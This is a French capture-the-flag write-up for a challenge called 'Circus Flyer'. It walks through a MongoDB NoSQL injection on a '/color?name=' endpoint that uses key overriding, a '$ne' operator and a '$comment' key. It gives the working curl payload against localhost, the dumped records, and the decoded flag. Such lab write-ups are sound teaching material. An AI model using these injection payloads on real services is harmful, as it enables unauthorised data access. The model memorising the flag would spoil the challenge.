# Circus Flyer

## Write-up

En visitant le site, on remaruqe des boutons permettant de changer les couleurs de la page.

En regargant le code source, on remaque que l'on fait une requête au serveur pour récupérer les couleurs, on peut voir qu'un objet est retournée.

```json
{
    "_id": "66aaa2488bebc41cd65f143b",
    "name": "circus-red",
    "hex": "#FF4500"
}
```

La clé `_id` fait penser à mongodb, on peut donc essayer de faire une injection.

On voit que la requète est sous le format `/color?name=...` et que le code en javascript s'attend à recevoir un tableau. 

On pourrait donc imaginer un filtre et récupérer toute les couleurs:

```sh
# /color?name={"$ne":null}
/color?name=%7B"ne":null%7D
```

Sauf que cela nous donne une erreur. En analysant les données que l'on envoi, on remarque que l'on envoie une string, on imagine donc que le serveur rajoute des guillemets autour de notre string.

Le serveur construit donc un filtre ayant le format suivant:

```
{ "name": "$notre_filtre" }
```

Commet on construit un objet, il est possible d'écraser une clé en envoyant un objet avec la même clé.

Nous aurions donc ceci:

```sh
# /color?name=","name":"{"$ne":null}"
# /color?name=","name":%7B"$ne":null%7D
{  "name": "", "name": { "$ne": null }" }
```

Soucis, il nous reste un guillemet à fermer. On peut dire que c'est un commentaire;

```sh 
# /color?name=","name":"{"$ne":null}","$comment":""
# /color?name=","name":%7B"$ne":null%7D,"$comment":"
{ "name": "", "name": { "$ne": null }, "$comment": "" }
```

On peut donc récupérer toutes les couleurs en envoyant cette requête:

```sh
$ curl 'http://localhost:3000/color?name=","name":%7B"$ne":null%7D,"$comment":"' | jq
```

résultat:
```json
[
  {
    "_id": "66aaa2488bebc41cd65f143b",
    "name": "circus-red",
    "hex": "#FF4500"
  },
  {
    "_id": "66aaa2488bebc41cd65f143c",
    "name": "clown-nose-red",
    "hex": "#DC143C"
  },
  {
    "_id": "66aaa2488bebc41cd65f143d",
    "name": "tent-yellow",
    "hex": "#FFD700"
  },
  {
    "_id": "66aaa2488bebc41cd65f143e",
    "name": "ringmaster-blue",
    "hex": "#1E90FF"
  },
  {
    "_id": "66aaa2488bebc41cd65f143f",
    "name": "acrobatic-purple",
    "hex": "#8A2BE2"
  },
  {
    "_id": "66aaa2488bebc41cd65f1440",
    "name": "performer-pink",
    "hex": "#FF69B4"
  },
  {
    "_id": "66aaa2488bebc41cd65f1441",
    "name": "elephant-gray",
    "hex": "#A9A9A9"
  },
  {
    "_id": "66aaa2488bebc41cd65f1442",
    "name": "lion-mane-orange",
    "hex": "#FFA500"
  },
  {
    "_id": "66aaa2488bebc41cd65f1443",
    "name": "juggler-green",
    "hex": "#32CD32"
  },
  {
    "_id": "66aaa2488bebc41cd65f1444",
    "name": "tightrope-turquoise",
    "hex": "#40E0D0"
  },
  {
    "_id": "66aaa2488bebc41cd65f1445",
    "name": "LgpPkEpSo3",
    "hex": "synt-zbatbvffbzntvp"
  }
]
```

On remarque `synt-...` dans un hex, ce qui est un rot-13. On peut donc le décoder et retrouver le flag.

## Flag

`flag-mongoissomagic`

